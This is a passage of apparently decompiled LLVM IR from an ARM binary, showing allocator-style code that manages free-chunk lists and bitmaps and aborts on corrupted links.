  %v2_13628 = inttoptr i32 %v1_13628 to i32*
  %v3_13628 = load i32, i32* %v2_13628, align 4
  %v1_1362c = urem i32 %v0_1362c, 32
  store i32 %v1_1362c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_13634 = shl i32 1, %v1_1362c
  %v8_13634 = or i32 %v3_13628, %v7_13634
  store i32 %v8_13634, i32* %r3.global-to-local, align 4
  %v1_13638 = load i32, i32* @r6, align 4
  %v2_13638 = add i32 %v1_13638, 12
  %v3_13638 = inttoptr i32 %v2_13638 to i32*
  store i32 %v0_13638, i32* %v3_13638, align 4
  %v0_1363c = load i32, i32* @lr, align 4
  %v1_1363c = load i32, i32* @r6, align 4
  %v2_1363c = add i32 %v1_1363c, 8
  %v3_1363c = inttoptr i32 %v2_1363c to i32*
  store i32 %v0_1363c, i32* %v3_1363c, align 4
  %v0_13640 = load i32, i32* %r3.global-to-local, align 4
  %v1_13640 = load i32, i32* %r1.global-to-local, align 4
  %v2_13640 = add i32 %v1_13640, 820
  %v3_13640 = inttoptr i32 %v2_13640 to i32*
  store i32 %v0_13640, i32* %v3_13640, align 4
  %v0_13644 = load i32, i32* @r6, align 4
  %v1_13644 = load i32, i32* @lr, align 4
  %v2_13644 = add i32 %v1_13644, 12
  %v3_13644 = inttoptr i32 %v2_13644 to i32*
  store i32 %v0_13644, i32* %v3_13644, align 4
  %v0_13648 = load i32, i32* @r6, align 4
  %v1_13648 = load i32, i32* %ip.global-to-local, align 4
  %v2_13648 = add i32 %v1_13648, 8
  %v3_13648 = inttoptr i32 %v2_13648 to i32*
  store i32 %v0_13648, i32* %v3_13648, align 4
  %v0_13664.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13664

dec_label_pc_13650:                               ; preds = %dec_label_pc_134f0, %dec_label_pc_134a8, %dec_label_pc_13504
  store i32 64, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r1.global-to-local, align 4
  %v4_13658 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 64) to i32*), align 4
  store i32 %v4_13658, i32* @sb, align 4
  %v0_1365c = load i32, i32* @sl, align 4
  %v1_1365c = add i32 %v0_1365c, 16
  store i32 %v1_1365c, i32* @fp, align 4
  %v1_13660 = add i32 %v4_13658, 52
  store i32 %v1_13660, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13664

dec_label_pc_13664:                               ; preds = %dec_label_pc_13618, %dec_label_pc_13650
  %v0_13584 = phi i32 [ %v0_13664.pre, %dec_label_pc_13618 ], [ %v1_13660, %dec_label_pc_13650 ]
  %v1_13664 = add i32 %v0_13584, 12
  %v2_13664 = inttoptr i32 %v1_13664 to i32*
  %v3_13664 = load i32, i32* %v2_13664, align 4
  store i32 %v3_13664, i32* @r6, align 4
  %v9_13668 = icmp eq i32 %v3_13664, %v0_13584
  br i1 %v9_13668, label %dec_label_pc_13670, label %dec_label_pc_13518

dec_label_pc_13670:                               ; preds = %dec_label_pc_13664
  %v0_13670 = load i32, i32* @sl, align 4
  %tmp209 = icmp ult i32 %v0_13670, 256
  %v0_13728.pre = load i32, i32* @r7, align 4
  br i1 %tmp209, label %dec_label_pc_13670.dec_label_pc_13728_crit_edge, label %dec_label_pc_13678

dec_label_pc_13670.dec_label_pc_13728_crit_edge:  ; preds = %dec_label_pc_13670
  %.pre203 = mul i32 %v0_13728.pre, 8
  br label %dec_label_pc_13728

dec_label_pc_13678:                               ; preds = %dec_label_pc_13670
  %v4_13678 = mul i32 %v0_13728.pre, 8
  %v5_13678 = add i32 %v4_13678, %v0_13584
  store i32 %v5_13678, i32* %r3.global-to-local, align 4
  %v1_1367c = add i32 %v5_13678, -8
  store i32 %v1_1367c, i32* %r1.global-to-local, align 4
  %v1_13680 = add i32 %v5_13678, 4
  %v2_13680 = inttoptr i32 %v1_13680 to i32*
  %storemerge.pre = load i32, i32* %v2_13680, align 4
  br label %dec_label_pc_13720

dec_label_pc_13688:                               ; preds = %dec_label_pc_13720
  %v1_13688 = add i32 %v1_136b0, 4
  %v2_13688 = inttoptr i32 %v1_13688 to i32*
  %v3_13688 = load i32, i32* %v2_13688, align 4
  store i32 %v3_13688, i32* %r3.global-to-local, align 4
  %v1_1368c = and i32 %v3_13688, -4
  store i32 %v1_1368c, i32* %r2.global-to-local, align 4
  %v3_13690 = icmp ult i32 %v1_1368c, %v0_13670
  %v1_13694 = add i32 %v1_136b0, 12
  %v2_13694 = inttoptr i32 %v1_13694 to i32*
  %v3_13694 = load i32, i32* %v2_13694, align 4
  store i32 %v3_13694, i32* %r0.global-to-local, align 4
  br i1 %v3_13690, label %dec_label_pc_13720, label %dec_label_pc_1369c

dec_label_pc_1369c:                               ; preds = %dec_label_pc_13688
  %v1_1369c = add i32 %v1_136b0, 8
  %v2_1369c = inttoptr i32 %v1_1369c to i32*
  %v3_1369c = load i32, i32* %v2_1369c, align 4
  store i32 %v3_1369c, i32* %r1.global-to-local, align 4
  %v1_136a0 = add i32 %v3_1369c, 12
  %v2_136a0 = inttoptr i32 %v1_136a0 to i32*
  %v3_136a0 = load i32, i32* %v2_136a0, align 4
  store i32 %v3_136a0, i32* %r3.global-to-local, align 4
  %v9_136a4 = icmp eq i32 %v3_136a0, %v1_136b0
  br i1 %v9_136a4, label %dec_label_pc_136ac, label %dec_label_pc_136b8

dec_label_pc_136ac:                               ; preds = %dec_label_pc_1369c
  %v1_136ac = add i32 %v3_13694, 8
  %v2_136ac = inttoptr i32 %v1_136ac to i32*
  %v3_136ac = load i32, i32* %v2_136ac, align 4
  store i32 %v3_136ac, i32* %r3.global-to-local, align 4
  %v9_136b0 = icmp eq i32 %v3_136ac, %v1_136b0
  br i1 %v9_136b0, label %dec_label_pc_136bc, label %dec_label_pc_136b8

dec_label_pc_136b8:                               ; preds = %dec_label_pc_1369c, %dec_label_pc_136ac
  %v0_136b8 = call i32 @abort()
  store i32 %v0_136b8, i32* %r0.global-to-local, align 4
  %v0_136bc.pre = load i32, i32* @sl, align 4
  %v1_136bc.pre = load i32, i32* @r2, align 4
  %v0_136c4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_136bc

dec_label_pc_136bc:                               ; preds = %dec_label_pc_136ac, %dec_label_pc_136b8
  %v1_136c4 = phi i32 [ %v3_13694, %dec_label_pc_136ac ], [ %v0_136b8, %dec_label_pc_136b8 ]
  %v0_136c4 = phi i32 [ %v3_1369c, %dec_label_pc_136ac ], [ %v0_136c4.pre, %dec_label_pc_136b8 ]
  %v1_136bc = phi i32 [ %v1_1368c, %dec_label_pc_136ac ], [ %v1_136bc.pre, %dec_label_pc_136b8 ]
  %v0_136bc = phi i32 [ %v0_13670, %dec_label_pc_136ac ], [ %v0_136bc.pre, %dec_label_pc_136b8 ]
  %v2_136bc = sub i32 %v1_136bc, %v0_136bc
  store i32 %v2_136bc, i32* %lr.global-to-local, align 4
  %v2_136c4 = add i32 %v1_136c4, 8
  %v3_136c4 = inttoptr i32 %v2_136c4 to i32*
  store i32 %v0_136c4, i32* %v3_136c4, align 4
  %v0_136c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_136c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_136c8 = add i32 %v1_136c8, 12
  %v3_136c8 = inttoptr i32 %v2_136c8 to i32*
  store i32 %v0_136c8, i32* %v3_136c8, align 4
  %v0_136cc = load i32, i32* %ip.global-to-local, align 4
  %v1_136cc = add i32 %v0_136cc, 8
  store i32 %v1_136cc, i32* %r0.global-to-local, align 4
  %tmp210 = icmp ugt i32 %v2_136bc, 15
  br i1 %tmp210, label %dec_label_pc_136ec, label %dec_label_pc_136d4

dec_label_pc_136d4:                               ; preds = %dec_label_pc_136bc
  %v1_136d4 = load i32, i32* %r2.global-to-local, align 4
  %v2_136d4 = add i32 %v1_136d4, %v0_136cc
  store i32 %v2_136d4, i32* %r2.global-to-local, align 4
  %v1_136d8 = add i32 %v2_136d4, 4
  %v2_136d8 = inttoptr i32 %v1_136d8 to i32*
  %v3_136d8 = load i32, i32* %v2_136d8, align 4
  store i32 %v3_136d8, i32* %r3.global-to-local, align 4
  store i32 %v1_136cc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_136e0

dec_label_pc_136e0.loopexit:                      ; preds = %dec_label_pc_13580
  %v1_1358c = load i32, i32* @r6, align 4
  %v2_1358c = load i32, i32* @sl, align 4
  %v3_1358c = add i32 %v2_1358c, %v1_1358c
  store i32 %v3_1358c, i32* %r2.global-to-local, align 4
  %v2_13590 = add i32 %v3_1358c, 4
  %v3_13590 = inttoptr i32 %v2_13590 to i32*
  %v4_13590 = load i32, i32* %v3_13590, align 4
  store i32 %v4_13590, i32* %r3.global-to-local, align 4
  %v2_13594 = add i32 %v1_1358c, 8
  store i32 %v2_13594, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_136e0

dec_label_pc_136e0:                               ; preds = %.dec_label_pc_136e0_crit_edge, %dec_label_pc_136e0.loopexit, %dec_label_pc_136d4
  %v1_136e4 = phi i32 [ %v4_13808, %.dec_label_pc_136e0_crit_edge ], [ %v3_1358c, %dec_label_pc_136e0.loopexit ], [ %v2_136d4, %dec_label_pc_136d4 ]
  %v0_136e0 = phi i32 [ %v7_13808, %.dec_label_pc_136e0_crit_edge ], [ %v4_13590, %dec_label_pc_136e0.loopexit ], [ %v3_136d8, %dec_label_pc_136d4 ]
  %v1_136e0 = or i32 %v0_136e0, 1
  store i32 %v1_136e0, i32* %r3.global-to-local, align 4
  %v2_136e4 = add i32 %v1_136e4, 4
  %v3_136e4 = inttoptr i32 %v2_136e4 to i32*
  store i32 %v1_136e0, i32* %v3_136e4, align 4
  br label %dec_label_pc_13ca8

dec_label_pc_136ec:                               ; preds = %dec_label_pc_136bc
  %v1_136ec = load i32, i32* @sl, align 4
  %v2_136ec = add i32 %v1_136ec, %v0_136cc
  store i32 %v2_136ec, i32* %r2.global-to-local, align 4
  %v1_136f0 = or i32 %v1_136ec, 1
  store i32 %v1_136f0, i32* %r3.global-to-local, align 4
  %v0_136f4 = load i32, i32* %lr.global-to-local, align 4
  %v1_136f4 = or i32 %v0_136f4, 1
  store i32 %v1_136f4, i32* %r1.global-to-local, align 4
  store i32 %v1_136cc, i32* %r4.global-to-local, align 4
  %v2_136fc = add i32 %v0_136cc, 4
  %v3_136fc = inttoptr i32 %v2_136fc to i32*
  store i32 %v1_136f0, i32* %v3_136fc, align 4
  %v0_13700 = load i32, i32* %r2.global-to-local, align 4
  %v1_13700 = load i32, i32* @r6, align 4
  %v2_13700 = add i32 %v1_13700, 8
  %v3_13700 = inttoptr i32 %v2_13700 to i32*
  store i32 %v0_13700, i32* %v3_13700, align 4
  %v0_13704 = load i32, i32* %r2.global-to-local, align 4
  %v1_13704 = load i32, i32* @r6, align 4
  %v2_13704 = add i32 %v1_13704, 12
  %v3_13704 = inttoptr i32 %v2_13704 to i32*
  store i32 %v0_13704, i32* %v3_13704, align 4
  %v0_13708 = load i32, i32* %lr.global-to-local, align 4
  %v1_13708 = load i32, i32* %r2.global-to-local, align 4
  %v3_13708 = add i32 %v1_13708, %v0_13708
  %v4_13708 = inttoptr i32 %v3_13708 to i32*
  store i32 %v0_13708, i32* %v4_13708, align 4
  %v0_1370c = load i32, i32* %r1.global-to-local, align 4
  %v1_1370c = load i32, i32* %r2.global-to-local, align 4
  %v2_1370c = add i32 %v1_1370c, 4
  %v3_1370c = inttoptr i32 %v2_1370c to i32*
  store i32 %v0_1370c, i32* %v3_1370c, align 4
  %v0_13710 = load i32, i32* @r6, align 4
  %v1_13710 = load i32, i32* %r2.global-to-local, align 4
  %v2_13710 = add i32 %v1_13710, 12
  %v3_13710 = inttoptr i32 %v2_13710 to i32*
  store i32 %v0_13710, i32* %v3_13710, align 4
  %v0_13714 = load i32, i32* @r6, align 4
  %v1_13714 = load i32, i32* %r2.global-to-local, align 4
  %v2_13714 = add i32 %v1_13714, 8
  %v3_13714 = inttoptr i32 %v2_13714 to i32*
  store i32 %v0_13714, i32* %v3_13714, align 4
  br label %dec_label_pc_13ca8

dec_label_pc_13720:                               ; preds = %dec_label_pc_13688, %dec_label_pc_13678
  %v1_136b0 = phi i32 [ %storemerge.pre, %dec_label_pc_13678 ], [ %v3_13694, %dec_label_pc_13688 ]
  store i32 %v1_136b0, i32* %ip.global-to-local, align 4
  %v9_13720 = icmp eq i32 %v1_136b0, %v1_1367c
  br i1 %v9_13720, label %dec_label_pc_13728.loopexit, label %dec_label_pc_13688

dec_label_pc_13728.loopexit:                      ; preds = %dec_label_pc_13720
  br label %dec_label_pc_13728

dec_label_pc_13728:                               ; preds = %dec_label_pc_13670.dec_label_pc_13728_crit_edge, %dec_label_pc_13728.loopexit
  %v4_13758.pre-phi = phi i32 [ %.pre203, %dec_label_pc_13670.dec_label_pc_13728_crit_edge ], [ %v4_13678, %dec_label_pc_13728.loopexit ]
  %v1_13728 = add i32 %v0_13728.pre, 1
  store i32 %v1_13728, i32* %r2.global-to-local, align 4
  %v1_1372c = urem i32 %v1_13728, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r0.global-to-local, align 4
  %v6_13738 = shl i32 1, %v1_1372c
  store i32 %v6_13738, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_13740 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 64) to i32*), align 4
  store i32 %v4_13740, i32* %r3.global-to-local, align 4
  %v3_13744 = udiv i32 %v1_13728, 32
  store i32 %v3_13744, i32* @r5, align 4
  %v4_13748 = mul nuw nsw i32 %v3_13744, 4
  %v5_13748 = add i32 %v4_13740, %v4_13748
  store i32 %v5_13748, i32* %r2.global-to-local, align 4
  %v1_1374c = add i32 %v5_13748, 820
  %v2_1374c = inttoptr i32 %v1_1374c to i32*
  %v3_1374c = load i32, i32* %v2_1374c, align 4
  store i32 %v3_1374c, i32* @r4, align 4
  %v1_13750 = add i32 %v4_13740, 52
  store i32 %v1_13750, i32* %r3.global-to-local, align 4
  store i32 64, i32* @r8, align 4
  %v5_13758 = add i32 %v1_13750, %v4_13758.pre-phi
  store i32 %v5_13758, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1375c

dec_label_pc_1375c:                               ; preds = %dec_label_pc_137c4, %dec_label_pc_13728
  %v1_13764 = phi i32 [ %v1_13764.pre, %dec_label_pc_137c4 ], [ %v3_1374c, %dec_label_pc_13728 ]
  %v0_13764 = phi i32 [ %v0_1375c.pre, %dec_label_pc_137c4 ], [ %v6_13738, %dec_label_pc_13728 ]
  %v1_1375c = sub i32 1, %v0_13764
  %v2_1375c = icmp ult i32 %v0_13764, 2
  %v1_1375c. = select i1 %v2_1375c, i32 %v1_1375c, i32 0
  store i32 %v1_1375c., i32* %r3.global-to-local, align 4
  %tmp144 = icmp ugt i32 %v0_13764, %v1_13764
  br i1 %tmp144, label %.thread15, label %bb145

.thread15:                                        ; preds = %dec_label_pc_1375c
  %v5_13768 = or i32 %v1_1375c., 1
  store i32 %v5_13768, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13774.preheader

bb145:                                            ; preds = %dec_label_pc_1375c
  %v2_1376c = icmp eq i32 %v1_1375c., 0
  br i1 %v2_1376c, label %.dec_label_pc_137b0.preheader_crit_edge, label %dec_label_pc_13774.preheader

.dec_label_pc_137b0.preheader_crit_edge:          ; preds = %bb145
  %v0_137a857.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_137b0.preheader

dec_label_pc_13774.preheader:                     ; preds = %bb145, %.thread15
  %v0_13774.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13774

dec_label_pc_13774:                               ; preds = %dec_label_pc_13774.preheader, %dec_label_pc_13780
  %v0_13774 = phi i32 [ %v0_13774.pre, %dec_label_pc_13774.preheader ], [ %v1_13774, %dec_label_pc_13780 ]
  %v1_13774 = add i32 %v0_13774, 1
  store i32 %v1_13774, i32* @r5, align 4
  %tmp211 = icmp ugt i32 %v1_13774, 2
  br i1 %tmp211, label %dec_label_pc_13854.loopexit, label %dec_label_pc_13780

dec_label_pc_13780:                               ; preds = %dec_label_pc_13774
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r3.global-to-local, align 4
  %v1_13784 = load i32, i32* @r8, align 4
  %v2_13784 = add i32 %v1_13784, ptrtoint (i32* @global_var_23378.488 to i32)
  %v3_13784 = inttoptr i32 %v2_13784 to i32*
  %v4_13784 = load i32, i32* %v3_13784, align 4
  store i32 %v4_13784, i32* %r2.global-to-local, align 4
  %v4_13788 = mul i32 %v1_13774, 4
  %v5_13788 = add i32 %v4_13784, %v4_13788
  store i32 %v5_13788, i32* %r3.global-to-local, align 4
  %v1_1378c = add i32 %v5_13788, 820
  %v2_1378c = inttoptr i32 %v1_1378c to i32*
  %v3_1378c = load i32, i32* %v2_1378c, align 4
  store i32 %v3_1378c, i32* @r4, align 4
  %v2_13790 = icmp eq i32 %v3_1378c, 0
  br i1 %v2_13790, label %dec_label_pc_13774, label %dec_label_pc_13798

dec_label_pc_13798:                               ; preds = %dec_label_pc_13780
  %v4_13798 = mul i32 %v1_13774, 256
  %v5_13798 = add i32 %v4_13784, %v4_13798
  store i32 %v5_13798, i32* %r3.global-to-local, align 4
  %v1_1379c = add i32 %v5_13798, 44
  store i32 %v1_1379c, i32* %r0.global-to-local, align 4
  %v0_137a0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_137a0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_137b0.preheader

dec_label_pc_137b0.preheader:                     ; preds = %.dec_label_pc_137b0.preheader_crit_edge, %dec_label_pc_13798
  %v0_137a857 = phi i32 [ %v1_1379c, %dec_label_pc_13798 ], [ %v0_137a857.pre, %.dec_label_pc_137b0.preheader_crit_edge ]
  %v0_137cc = phi i32 [ %v3_1378c, %dec_label_pc_13798 ], [ %v1_13764, %.dec_label_pc_137b0.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_137a0, %dec_label_pc_13798 ], [ %v0_13764, %.dec_label_pc_137b0.preheader_crit_edge ]
  %v2_137b054 = and i32 %ip.promoted, %v0_137cc
  %v4_137b056 = icmp eq i32 %v2_137b054, 0
  br i1 %v4_137b056, label %dec_label_pc_137a8, label %dec_label_pc_137b8

dec_label_pc_137a8:                               ; preds = %dec_label_pc_137b0.preheader, %dec_label_pc_137a8
  %v2_137ac59 = phi i32 [ %v2_137ac, %dec_label_pc_137a8 ], [ %ip.promoted, %dec_label_pc_137b0.preheader ]
  %v0_137a858 = phi i32 [ %v1_137a8, %dec_label_pc_137a8 ], [ %v0_137a857, %dec_label_pc_137b0.preheader ]
  %v1_137a8 = add i32 %v0_137a858, 8
  %v2_137ac = mul i32 %v2_137ac59, 2
  %v2_137b0 = and i32 %v2_137ac, %v0_137cc
  %v4_137b0 = icmp eq i32 %v2_137b0, 0
  br i1 %v4_137b0, label %dec_label_pc_137a8, label %dec_label_pc_137b0.dec_label_pc_137b8_crit_edge

dec_label_pc_137b0.dec_label_pc_137b8_crit_edge:  ; preds = %dec_label_pc_137a8
  store i32 %v1_137a8, i32* %r0.global-to-local, align 4
  store i32 %v2_137ac, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_137b8

dec_label_pc_137b8:                               ; preds = %dec_label_pc_137b0.dec_label_pc_137b8_crit_edge, %dec_label_pc_137b0.preheader
  %v0_137d8 = phi i32 [ %v2_137ac, %dec_label_pc_137b0.dec_label_pc_137b8_crit_edge ], [ %ip.promoted, %dec_label_pc_137b0.preheader ]
  %v0_137fc = phi i32 [ %v1_137a8, %dec_label_pc_137b0.dec_label_pc_137b8_crit_edge ], [ %v0_137a857, %dec_label_pc_137b0.preheader ]
  %v1_137b8 = add i32 %v0_137fc, 12
  %v2_137b8 = inttoptr i32 %v1_137b8 to i32*
  %v3_137b8 = load i32, i32* %v2_137b8, align 4
  store i32 %v3_137b8, i32* @lr, align 4
  %v9_137bc = icmp eq i32 %v3_137b8, %v0_137fc
  br i1 %v9_137bc, label %dec_label_pc_137c4, label %dec_label_pc_137e4

dec_label_pc_137c4:                               ; preds = %dec_label_pc_137b8
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r0.global-to-local, align 4
  %v1_137c8 = load i32, i32* @r8, align 4
  %v2_137c8 = add i32 %v1_137c8, ptrtoint (i32* @global_var_23378.488 to i32)
  %v3_137c8 = inttoptr i32 %v2_137c8 to i32*
  %v4_137c8 = load i32, i32* %v3_137c8, align 4
  %v2_137cc = sub i32 -1, %v0_137d8
  %v3_137cc = and i32 %v0_137cc, %v2_137cc
  store i32 %v3_137cc, i32* @r4, align 4
  %v1_137d0 = load i32, i32* @r5, align 4
  %v4_137d0 = mul i32 %v1_137d0, 4
  %v5_137d0 = add i32 %v4_137d0, %v4_137c8
  store i32 %v5_137d0, i32* %r3.global-to-local, align 4
  %v1_137d4 = add i32 %v0_137fc, 8
  store i32 %v1_137d4, i32* %r0.global-to-local, align 4
  %v2_137d8 = mul i32 %v0_137d8, 2
  store i32 %v2_137d8, i32* %ip.global-to-local, align 4
  %v2_137dc = add i32 %v5_137d0, 820
  %v3_137dc = inttoptr i32 %v2_137dc to i32*
  store i32 %v3_137cc, i32* %v3_137dc, align 4
  %v0_1375c.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_13764.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1375c

dec_label_pc_137e4:                               ; preds = %dec_label_pc_137b8
  %v1_137e4 = add i32 %v3_137b8, 4
  %v2_137e4 = inttoptr i32 %v1_137e4 to i32*
  %v3_137e4 = load i32, i32* %v2_137e4, align 4
  store i32 %v3_137e4, i32* %r3.global-to-local, align 4
  %v1_137e8 = and i32 %v3_137e4, -4
  store i32 %v1_137e8, i32* %r2.global-to-local, align 4
  %v0_137ec = load i32, i32* @sl, align 4
  %v2_137ec = sub i32 %v1_137e8, %v0_137ec
  store i32 %v2_137ec, i32* %ip.global-to-local, align 4
  %v1_137f0 = add i32 %v3_137b8, 12
  %v2_137f0 = inttoptr i32 %v1_137f0 to i32*
  %v3_137f0 = load i32, i32* %v2_137f0, align 4
  store i32 %v3_137f0, i32* %r3.global-to-local, align 4
  %tmp212 = icmp ult i32 %v2_137ec, 16
  br i1 %tmp212, label %bb146, label %bb147

bb146:                                            ; preds = %dec_label_pc_137e4
  %v6_137f8 = add i32 %v1_137e8, %v3_137b8
  store i32 %v6_137f8, i32* %r2.global-to-local, align 4
  br label %bb147

bb147:                                            ; preds = %dec_label_pc_137e4, %bb146
  %v2_137fc = add i32 %v3_137f0, 8
  %v3_137fc = inttoptr i32 %v2_137fc to i32*
  store i32 %v0_137fc, i32* %v3_137fc, align 4
  %v0_13800 = load i32, i32* %r3.global-to-local, align 4
  %v1_13800 = load i32, i32* %r0.global-to-local, align 4
  %v2_13800 = add i32 %v1_13800, 12
  %v3_13800 = inttoptr i32 %v2_13800 to i32*
  store i32 %v0_13800, i32* %v3_13800, align 4
  %v4_13804 = load i32, i32* @lr, align 4
  br i1 %tmp212, label %.dec_label_pc_136e0_crit_edge, label %dec_label_pc_13810

.dec_label_pc_136e0_crit_edge:                    ; preds = %bb147
  %v5_13804 = add i32 %v4_13804, 8
  store i32 %v5_13804, i32* %r4.global-to-local, align 4
  %v4_13808 = load i32, i32* %r2.global-to-local, align 4
  %v5_13808 = add i32 %v4_13808, 4
  %v6_13808 = inttoptr i32 %v5_13808 to i32*
  %v7_13808 = load i32, i32* %v6_13808, align 4
  store i32 %v7_13808, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_136e0

dec_label_pc_13810:                               ; preds = %bb147
  %v1_13810 = load i32, i32* @sl, align 4
  %v2_13810 = add i32 %v1_13810, %v4_13804
  store i32 %v2_13810, i32* %r1.global-to-local, align 4
  %v1_13818 = load i32, i32* @r6, align 4
  %v2_13818 = add i32 %v1_13818, 8
  %v3_13818 = inttoptr i32 %v2_13818 to i32*
  store i32 %v2_13810, i32* %v3_13818, align 4
  %v0_1381c = load i32, i32* %r1.global-to-local, align 4
  %v1_1381c = load i32, i32* @r6, align 4
  %v2_1381c = add i32 %v1_1381c, 12
  %v3_1381c = inttoptr i32 %v2_1381c to i32*
  store i32 %v0_1381c, i32* %v3_1381c, align 4
  %v0_13820 = load i32, i32* @r6, align 4
  %v1_13820 = load i32, i32* %r1.global-to-local, align 4
  %v2_13820 = add i32 %v1_13820, 8
  %v3_13820 = inttoptr i32 %v2_13820 to i32*
  store i32 %v0_13820, i32* %v3_13820, align 4
  %v0_13824 = load i32, i32* @r6, align 4
  %v1_13824 = load i32, i32* %r1.global-to-local, align 4
  %v2_13824 = add i32 %v1_13824, 12
  %v3_13824 = inttoptr i32 %v2_13824 to i32*
  store i32 %v0_13824, i32* %v3_13824, align 4
  %tmp213 = icmp ult i32 %v1_13810, 256
  br i1 %tmp213, label %bb148, label %.thread124

bb148:                                            ; preds = %dec_label_pc_13810
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r2.global-to-local, align 4
  %v8_13830 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 64) to i32*), align 4
  store i32 %v8_13830, i32* %r3.global-to-local, align 4
  %v4_13834 = load i32, i32* %r1.global-to-local, align 4
  %v6_13834 = add i32 %v8_13830, 48
  %v7_13834 = inttoptr i32 %v6_13834 to i32*
  store i32 %v4_13834, i32* %v7_13834, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_13810, %bb148
  %v0_13838 = load i32, i32* @sl, align 4
  %v1_13838 = or i32 %v0_13838, 1
  store i32 %v1_13838, i32* %r2.global-to-local, align 4
  %v0_1383c = load i32, i32* %ip.global-to-local, align 4
  %v1_1383c = or i32 %v0_1383c, 1
  store i32 %v1_1383c, i32* %r3.global-to-local, align 4
  %v0_13840 = load i32, i32* @lr, align 4
  %v1_13840 = add i32 %v0_13840, 8
  store i32 %v1_13840, i32* %r4.global-to-local, align 4
  %v2_13844 = add i32 %v0_13840, 4
  %v3_13844 = inttoptr i32 %v2_13844 to i32*
  store i32 %v1_13838, i32* %v3_13844, align 4
  %v0_13848 = load i32, i32* %ip.global-to-local, align 4
  %v1_13848 = load i32, i32* %r1.global-to-local, align 4
  %v3_13848 = add i32 %v1_13848, %v0_13848
  %v4_13848 = inttoptr i32 %v3_13848 to i32*
  store i32 %v0_13848, i32* %v4_13848, align 4
  %v0_1384c = load i32, i32* %r3.global-to-local, align 4
  %v1_1384c = load i32, i32* %r1.global-to-local, align 4
  %v2_1384c = add i32 %v1_1384c, 4
  %v3_1384c = inttoptr i32 %v2_1384c to i32*
  store i32 %v0_1384c, i32* %v3_1384c, align 4
  br label %dec_label_pc_13ca8

dec_label_pc_13854.loopexit:                      ; preds = %dec_label_pc_13774
  br label %dec_label_pc_13854

dec_label_pc_13854:                               ; preds = %dec_label_pc_13854.loopexit, %dec_label_pc_13468, %dec_label_pc_13470
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %ip.global-to-local, align 4
  %v4_1385c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 64) to i32*), align 4
  store i32 %v4_1385c, i32* @r0, align 4
  %v1_13860 = add i32 %v4_1385c, 44
  %v2_13860 = inttoptr i32 %v1_13860 to i32*
  %v3_13860 = load i32, i32* %v2_13860, align 4
  store i32 %v3_13860, i32* %ip.global-to-local, align 4
  %v1_13864 = add i32 %v3_13860, 4
  %v2_13864 = inttoptr i32 %v1_13864 to i32*
  %v3_13864 = load i32, i32* %v2_13864, align 4
  %v0_13868 = load i32, i32* @sl, align 4
  %v1_13868 = add i32 %v0_13868, 16
  store i32 %v1_13868, i32* %r1.global-to-local, align 4
  %v1_1386c = and i32 %v3_13864, -4
  store i32 %v1_1386c, i32* %r3.global-to-local, align 4
  %v3_13870 = icmp ult i32 %v1_1386c, %v1_13868
  br i1 %v3_13870, label %dec_label_pc_138a0, label %dec_label_pc_1387c

dec_label_pc_1387c:                               ; preds = %dec_label_pc_13854
  %v2_1387c = sub i32 %v1_1386c, %v0_13868
  %v2_13880 = add i32 %v0_13868, %v3_13860
  store i32 %v2_13880, i32* %r1.global-to-local, align 4
  %v1_13884 = or i32 %v2_1387c, 1
  store i32 %v1_13884, i32* %r3.global-to-local, align 4
  %v1_13888 = or i32 %v0_13868, 1
  store i32 %v1_13888, i32* %r2.global-to-local, align 4
  %v1_1388c = add i32 %v3_13860, 8
  store i32 %v1_1388c, i32* %r4.global-to-local, align 4
  store i32 %v1_13888, i32* %v2_13864, align 4
  %v0_13894 = load i32, i32* %r1.global-to-local, align 4
  %v1_13894 = load i32, i32* @r0, align 4
  %v2_13894 = add i32 %v1_13894, 44
  %v3_13894 = inttoptr i32 %v2_13894 to i32*
  store i32 %v0_13894, i32* %v3_13894, align 4
  %v0_13898 = load i32, i32* %r3.global-to-local, align 4
  %v1_13898 = load i32, i32* %r1.global-to-local, align 4
  %v2_13898 = add i32 %v1_13898, 4
  %v3_13898 = inttoptr i32 %v2_13898 to i32*
  store i32 %v0_13898, i32* %v3_13898, align 4
  br label %dec_label_pc_13ca8

dec_label_pc_138a0:                               ; preds = %dec_label_pc_13854
  %v1_138a0 = inttoptr i32 %v4_1385c to i32*
  %v2_138a0 = load i32, i32* %v1_138a0, align 4
  store i32 %v2_138a0, i32* %r3.global-to-local, align 4
  %v1_138a4 = and i32 %v2_138a0, 2
  store i32 %v1_138a4, i32* %ip.global-to-local, align 4
